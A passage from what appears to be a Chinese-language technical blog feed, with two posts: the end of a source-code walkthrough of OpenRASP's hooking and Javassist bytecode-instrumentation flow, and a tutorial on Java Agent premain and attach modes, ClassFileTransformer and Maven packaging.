class="keyword">new</span> <span class="title class_">SqlResultChecker</span>(<span class="literal">false</span>), <span class="number">0</span>),</span><br><span class="line">    <span class="comment">// 安全基线检测</span></span><br><span class="line">    POLICY_LOG(<span class="string">&quot;log&quot;</span>, <span class="keyword">new</span> <span class="title class_">LogChecker</span>(<span class="literal">false</span>), <span class="number">1</span> &lt;&lt; <span class="number">22</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><p>​initTransformer(inst)用于管理字节码转换器，CustomClassTransformer是OpenRASP唯一实现的ClassFileTransformer。根据Java Agent，inst.addTransformer将ClassFileTransformer实现类实例加入JVM，之后有新的类被JVM加载时，JVM会自动回调该转换器实例的transform方法。initTransformer(inst)调用了transformer.retransform，这是对已经加载的类进行重新转换，对于已经被加载的类，会经由retransform方法到transform。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EngineBoot:</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initTransformer</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">CustomClassTransformer</span>(inst);</span><br><span class="line">    transformer.retransform();</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /transformer/CustomClassTransformer:</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CustomClassTransformer</span><span class="params">(Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.inst = inst;</span><br><span class="line">    inst.addTransformer(<span class="built_in">this</span>, <span class="literal">true</span>);</span><br><span class="line">    addAnnotationHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在CustomClassTransformer构造函数中调用的addAnnotationHook方法，会读取hook包中所有被@HookAnnotation注解的class，然后缓存到HashSet<AbstractClassHook> CustomClassTransformer.hooks，这些类继承了AbstractClassHook，我称他们为hook类。</p><blockquote><p>​hook类的作用是，在类加载时，在类的指定方法中插入检测代码，在类的该方法执行时，检测代码会通过反射执行hook类的某些方法，从而对该类的传参进行检查。</p></blockquote><p>​对于CustomClassTransformer类，我们知道transform方法是回调方法，是实现该接口的关键。在CustomClassTransformer$transform方法中，会遍历hooks中所有缓存的hook类，先判断当前拦截类是否匹配这些hook类，如果是就利用javassit创建ctClass，接着调用该hook类的transformClass方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /transformer/CustomClassTransformer:</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                        ProtectionDomain domain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span>) &#123;</span><br><span class="line">        DependencyFinder.addJarPath(domain);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span> &amp;&amp; jspClassLoaderNames.contains(loader.getClass().getName())) &#123;</span><br><span class="line">        jspClassLoaderCache.put(className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;ClassLoader&gt;(loader));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> AbstractClassHook hook : hooks) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hook.isClassMatched(className)) &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">                addLoader(classPool, loader);</span><br><span class="line">                ctClass = classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">                    hook.setLoadedByBootstrapLoader(<span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                classfileBuffer = hook.transformClass(ctClass);</span><br><span class="line">                <span class="keyword">if</span> (classfileBuffer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    checkNecessaryHookType(hook.getType());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    ctClass.detach();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    serverDetector.detectServer(className, loader, domain);</span><br><span class="line">    <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>​transformClass是AbstractClassHook抽象类的方法，会调用hookMethod抽象方法。不同的hook类重写了AbstractClassHook的hookMethod，接下来以OgnlHook类为例。</p><p>​继承AbstractClassHook的OgnlHook类，实现该hookMethod抽象方法时，先通过getInvokeStaticSrc方法生成需要插入到代码中的字节码，然后调用inserAfter方法将字节码插入到hook点的后面。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">    insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插桩部分"><a href="#插桩部分" class="headerlink" title="插桩部分"></a>插桩部分</h3><p>​看一下插入的字节码是如何生成的？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,<span class="string">&quot;$_&quot;</span>, Object.class);</span><br></pre></td></tr></table></figure><p>​getInvokeStaticSrc用于构造payload，返回一段关于反射执行的代码，即被插入的类方法在执行时，会反射得到当前hook类OgnlHook，调用methodName所指定的方法checkOgnlExpression，即执行OgnlHook$checkOgnlExpression。</p><p>​回想这些方法调用，都是CustomClassTransformer$transform方法拦截到当前类，判断当前类是否在hook类中才进行操作。所以上面调用getInvokeStaticSrc生成字节码后，inserAfter就把这段字节码插入到当前类ctClass的某些方法上了。</p><p>​整个过程，是openRASP拦截到类加载，通过ognlHook判断ognl&#x2F;OgnlParser类是我们需要关注的类，把一段代码插桩到OgnlParser类的某些方法上；当OgnlParser类的这些方法被调用时，就会反射获取ognlHook实例，并调用其checkOgnlExpression，以执行相应的检测逻辑。</p><p>​看一下到底把字节码插到类的哪些方法上？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(CtClass ctClass, String methodName, String desc, String src, <span class="type">boolean</span> asFinally)</span>；</span><br><span class="line">官方注释：</span><br><span class="line">ctClass 目标类；methodName 目标方法名称；desc 目标方法的描述符号；src 要插入的源代码；asFinally 是否在抛出异常的时候同样执行该源代码。</span><br></pre></td></tr></table></figure><p>​在ognl类案例中，目标方法名称为”topLevelExpression”，这是OgnlParser类业务代码中可以方便得到传参expression的地方：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">node = <span class="keyword">new</span> <span class="title class_">OgnlParser</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(expression)).topLevelExpression()</span><br></pre></td></tr></table></figure><h3 id="V8部分"><a href="#V8部分" class="headerlink" title="V8部分"></a>V8部分</h3><p>​在OgnlParser$topLevelExpression方法被调用时，会反射执行OgnlHook$checkOgnlExpression方法。该方法会调用HookHandler.doCheck(CheckParameter.Type.OGNL, params)，经过关于云控和负载的统一检查后，最终来到CheckerManager.check(type, parameter)。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkOgnlExpression</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> String.valueOf(object);</span><br><span class="line">        <span class="keyword">if</span> (expression.length() &gt;= Config.getConfig().getOgnlMinLength()) &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">            params.put(<span class="string">&quot;expression&quot;</span>, expression);</span><br><span class="line">            HookHandler.doCheck(CheckParameter.Type.OGNL, params);</span><br><span class="line">            <span class="comment">//参数包括初始化时CheckParameter.TYPE枚举类，以及当前方法OgnlParser$topLevelExpression的参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​CheckerManager.check根据当前类型Type.OGNL，从枚举映射CheckerManager.checkers中获取对应的V8AttackChecker，故调用js插件完成对参数的检测。如果符合匹配规则则返回block为true，调用handleBlock(parameter)抛出异常，完成攻击拦截。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /plugin/checker/CheckParameter.java：</span></span><br><span class="line">OGNL(<span class="string">&quot;ognl&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span> &lt;&lt; <span class="number">10</span>)</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /plugin/checker/CheckerManager.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> checkers.get(type).check(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一段话总结"><a href="#一段话总结" class="headerlink" title="一段话总结"></a>一段话总结</h2><p>​ OpenRASP初始化时，先将CheckParameter中的Hook类添加到枚举映射checkers中，然后实例化类文件转换器CustomClassTransformer类，调用CustomClassTransformer$retransform，对Instrumentation已经加载的类hook。对hook点管理的初始化，是在CustomClassTransformer类实例化时，调用其addAnnotationHook，将所有需要的hook类添加到HashSet<AbstractClassHook> hooks。</p><p>​ OpenRASP通过CustomClassTransformer$transform拦截到类加载时，会遍历初始化得到的hooks中的所有hook类，判断是否匹配当前类，如果是则把一段代码插到当前类的指定方法。这段代码的作用是，当此类的目标方法被调用时，就会反射获取该类对应的AbstractClassHook实例，并反射调用该hook类的指定方法，完成相应检测逻辑。</p><p>​这段代码是通过javassit生成的，首先通过getInvokeStaticSrc生成代码字符串，再通过insertAfter将字符串插入到目标类的指定方法。代码的效果是反射调用对应hook类的检测方法，该检测方法先通过HookHandler.doCheck统一进行关于云控和负载的检查，再根据传入的类从枚举映射checkers中获取对应checker，执行相应检测逻辑。</p><p>​一般获取到的是V8AttackChecker，可以对传入参数进行检查，如果符合匹配规则则返回block，调用handleBlock(parameter)抛出异常，完成攻击拦截。用户可以实时修改js文件中的检测规则，通过V8执行js，从而OpenRASP具备热部署性能。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一、OpenRASP 官方文档</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/</span></span><br><span class="line">二、浅谈RASP</span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/187415#h2-6</span></span><br><span class="line">三、OpenRASP学习笔记</span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/216886#h2-6</span></span><br><span class="line">四、Java底层防护 - OpenRASP核心源码浅析</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7005</span></span><br><span class="line">五、百度 OpenRASP 组成分析https:<span class="comment">//jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agent</title>
      <link href="/2022/11/18/Java-Agent/"/>
      <url>/2022/11/18/Java-Agent/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>  Java agent是通过Java Instrumentation API（<em>java.lang.intrumentation</em>）开发出的agent程序，这种程序能够以代理的形式监控或修改JVM中运行的Java程序，主要提供了动态检查或修改字节码的特性。用来实现Java调试，监控，诊断的插件工具。</p><p>  Java agent程序启动后是和JVM运行在同一个进程，大多agent的工作形式是作为服务端接收来自客户端的请求，然后根据请求命令调用JVMTI的相关接口再返回结果。</p><p>  JVMTI（JVM Tool Interface）是 Java 虚拟机所提供的 native 编程接口，可以用来开发并监控虚拟机，可以查看JVM内部的状态，并控制JVM应用程序的执行。即JVM本身就实现了对其自身状态检查的方法，agent程序只是在上层调用这些接口。JDK 5以前的agent程序，是用C&#x2F;C++编写的动态链接库，而JDK 5以后引入的Instrumentation机制，使得agent程序可以直接用Java代码编写。</p><h2 id="二、Instrument机制"><a href="#二、Instrument机制" class="headerlink" title="二、Instrument机制"></a>二、Instrument机制</h2><p>  Java agent程序有两种方式整合到目标应用（也就是目标JVM，目标进程），一种是main方法启动前执行，另一种是main方法内部通过attach来进行加载。为便于描述，称前者为Agent模式，称后者为Attach模式。</p><p>  JVM启动时，会先执行agent程序的premain方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。遗漏的主要是系统类，因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，这个方法是在目标应用的main方法启动前拦截大部分类的加载活动，既然可以拦截类的加载，就可以结合第三方的字节码编译工具，比如ASM，javassist，cglib等等来改写实现类。</p><h3 id="Agent模式（目标应用main方法启动前）"><a href="#Agent模式（目标应用main方法启动前）" class="headerlink" title="Agent模式（目标应用main方法启动前）"></a>Agent模式（目标应用main方法启动前）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -javaagent:/path/to/javaagent.jar -jar application.jar</span><br><span class="line">    <span class="comment">//-javaagent，后面跟着被打包成jar包的Java agent程序路径。</span></span><br><span class="line">java -javaagent:agent1.jar -javaagent:agent2.jar -jar application.jar</span><br><span class="line">    <span class="comment">//一个java程序中-javaagent参数的个数是没有限制的，所以可以添加任意多个javaagent。所有的java agent会按照你定义的顺序执行，例如：</span></span><br></pre></td></tr></table></figure><p>  开发Agent模式的Java agent程序时，jar包内容有一定规范：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>jar包中的MANIFEST.MF 文件必须指定 Premain-Class 项</span><br><span class="line"><span class="number">2.</span>Premain-Class 指定的那个类必须实现 premain() 方法</span><br></pre></td></tr></table></figure><p>  Premain-Class项指定的代理类需要实现premain方法，当agent整合到目标应用时，会先运行premain方法再执行目标的main方法。下面两种premain方法带Instrumentation参数的会被优先加载，不存在时才加载只有String参数的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//agentArgs是一个字符串，会随着jvm启动设置的参数得到</span></span><br><span class="line"><span class="comment">//inst就是我们需要的Instrumention实例了，由JVM传入。我们可以拿到这个实例后进行各种操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>; </span><br></pre></td></tr></table></figure><h3 id="Attach模式（目标应用之外，用一个attach应用将javaagent-jar注入到目标应用中）"><a href="#Attach模式（目标应用之外，用一个attach应用将javaagent-jar注入到目标应用中）" class="headerlink" title="Attach模式（目标应用之外，用一个attach应用将javaagent.jar注入到目标应用中）"></a>Attach模式（目标应用之外，用一个attach应用将javaagent.jar注入到目标应用中）</h3><p>  与Agent模式直接通过Java命令参数启动不同，Attach模式需要另外启动一个attach应用。</p><p>  在Attach模式整合agent程序的过程中，需要用到com.sun.tools.attach包下VirtualMachine类和VirtualMachineDescriptor类，下面是attach应用的一般实现逻辑。首先通过VirtualMachine$List方法获取系统内的所有jvm进程，再遍历jvm描述符，判断主类的类名是否为目标类，如果是的话，获取jvm进程pid，并通过VirtualMachine将agent.jar整合到目标应用的jvm上。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//attach模式的实现，底层调用如下，即通过发送load命令来加载</span></span><br><span class="line"><span class="comment">//InputStream in = this.execute(&quot;load&quot;, agentLibrary, isAbsolute ? &quot;true&quot; : &quot;false&quot;, options);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main running&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vir : list) &#123;</span><br><span class="line">            System.out.println(vir.displayName());<span class="comment">//打印JVM加载类名</span></span><br><span class="line">            <span class="keyword">if</span> (vir.displayName().endsWith(<span class="string">&quot;com.test.test&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">attach</span> <span class="operator">=</span> VirtualMachine.attach(vir.id());   <span class="comment">//attach注入一个jvm id注入进去</span></span><br><span class="line">                attach.loadAgent(<span class="string">&quot;out\\Agent1-1.0-SNAPSHOT.jar&quot;</span>);<span class="comment">//加载agent</span></span><br><span class="line">                attach.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  和前面的permain类似，代理类需要定义一个agentmain方法的类，同样是带Instrumentation参数的优先级更高。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure><h3 id="Instrumentation接口和ClassFileTransformer接口的实现"><a href="#Instrumentation接口和ClassFileTransformer接口的实现" class="headerlink" title="Instrumentation接口和ClassFileTransformer接口的实现"></a>Instrumentation接口和ClassFileTransformer接口的实现</h3><p>  Agent模式或Attach模式只是把agent程序整合到目标应用的不同方式，agent程序的内容则是相同的，都是通过<em>java.lang.intrumentation</em>包中的Instrumentation接口和ClassFileTransformer接口实现，实现逻辑如下，区别仅在代理类分别实现了premain方法和agentmain方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="comment">//public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentArgs&quot;</span>+agentArgs);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);<span class="comment">//调用addTransformer添加一个Transformer</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> ------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;premain load class&quot;</span>+className); <span class="comment">//打印加载的类</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  Instrumentation接口和ClassFileTransformer接口更多的源码介绍记录在附录。</p><p>  总的来说，就是通过premain或agentmain表明agent程序的入口，JVM传入的instrumentation实例，主要用来设置类文件转换器。而ClassFileTransformer接口就是类文件转换器，我们通过addTransformer方法向JVM注册自定义的ClassFileTransformer，当有新的类被JVM加载时，JVM会自动回调我们定义的转换器的transform方法。</p><p>  回过头来再想想，JVMTI是基于事件驱动的，JVM每执行到一定的逻辑（比如新的类加载）就会调用一些事件的回调接口（如果有的话），这些接口可以供开发者去扩展自己的逻辑。JVM回调的是JVMTI接口，这些接口本身就是暴露出来供用户扩展，而继续往上就是我们实现的Instrumentation接口和ClassFileTransformer接口。JVMTI和java.lang.intrumentation提供的接口可以被理解为回调函数，并完成不同语言的交互问题。当我们实现agent程序时，即为JVM实现了回调函数，这些回调函数主要被用来修改字节码。</p><p>  附录中有大佬描述的JVM ClassFileLoadHook回调实现。</p><h2 id="三、打包"><a href="#三、打包" class="headerlink" title="三、打包"></a>三、打包</h2><p>在SRC\META-INF\MANIFEST.MF文件中添加内容</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line">Premain-Class: com.bmsk.App</span><br></pre></td></tr></table></figure><p>在maven项目的pom.xml中配置打包插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">        &lt;archive&gt;</span><br><span class="line">            &lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br><span class="line">            &lt;manifest&gt;</span><br><span class="line">                &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class="line">            &lt;/manifest&gt;</span><br><span class="line">            &lt;manifestEntries&gt;</span><br><span class="line">                &lt;Premain-Class&gt;com.bmsk.App&lt;/Premain-Class&gt;</span><br><span class="line">                &lt;Agent-Class&gt;com.bmsk.App&lt;/Agent-Class&gt;</span><br><span class="line">                &lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;</span><br><span class="line">                &lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;</span><br><span class="line">            &lt;/manifestEntries&gt;</span><br><span class="line">        &lt;/archive&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>命令行输入mvn clean -&gt; mvn package，或者直接点击maven插件的package按钮。</p><h2 id="四、OpenRASP和Java-Agent"><a href="#四、OpenRASP和Java-Agent" class="headerlink" title="四、OpenRASP和Java Agent"></a>四、OpenRASP和Java Agent</h2><p>这里以目前对Java Agent的理解，讲一讲对Open RASP的疑问吧：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>agent程序是在类加载时修改字节码，怎么样实现对方法调用的监控？是修改字节码时修改了目标类的方法，使得该方法被调用时能传递信息给外部程序记录，云控就是在这个位置吗？还是有方法调用相关的JVMTI事件，从而能挂上方法调用相关的回调接口？</span><br><span class="line"><span class="number">2.</span>云控怎样实现和优化，云控在OpenRASP的哪些位置出现，是否灵活？</span><br><span class="line"><span class="number">2.</span>agent程序和JavaScript执行引擎是怎样相互配合的，热补丁能否通过JavaScript以外其他方式实现？</span><br></pre></td></tr></table></figure><p>具体的答案还需要以后慢慢探索。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一、Java JVMTI和Instrumention机制介绍</span><br><span class="line">https:<span class="comment">//www.jianshu.com/p/eff047d4480a</span></span><br><span class="line">二、Java 安全之Java Agent</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/nice0e3/p/14086165.html</span></span><br><span class="line">三、java agent简介</span><br><span class="line">https:<span class="comment">//blog.csdn.net/a724888/article/details/127004488</span></span><br><span class="line">四、javaagent使用指南</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/rickiyang/p/11368932.html</span></span><br><span class="line">五、Instrumentation接口详解</span><br><span class="line">https:<span class="comment">//www.bbsmax.com/A/x9J2LvLgd6/</span></span><br><span class="line">六、一种JDBC Attack的新方式</span><br><span class="line">    http:<span class="comment">//tttang.com/archive/1831/</span></span><br></pre></td></tr></table></figure><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="Instrumentation接口源码"><a href="#Instrumentation接口源码" class="headerlink" title="Instrumentation接口源码"></a>Instrumentation接口源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//添加ClassFileTransformer</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加ClassFileTransformer</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//移除ClassFileTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否可以被重新定义</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRetransformClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新定义Class文件</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否可以修改Class文件</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取所有加载的Class</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取指定类加载器已经初始化的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取某个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加指定jar包到启动类加载器检索路径</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加指定jar包到系统类加载检索路径</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本地方法是否支持前缀</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isNativeMethodPrefixSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置本地方法前缀，一般用于按前缀做匹配操作</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 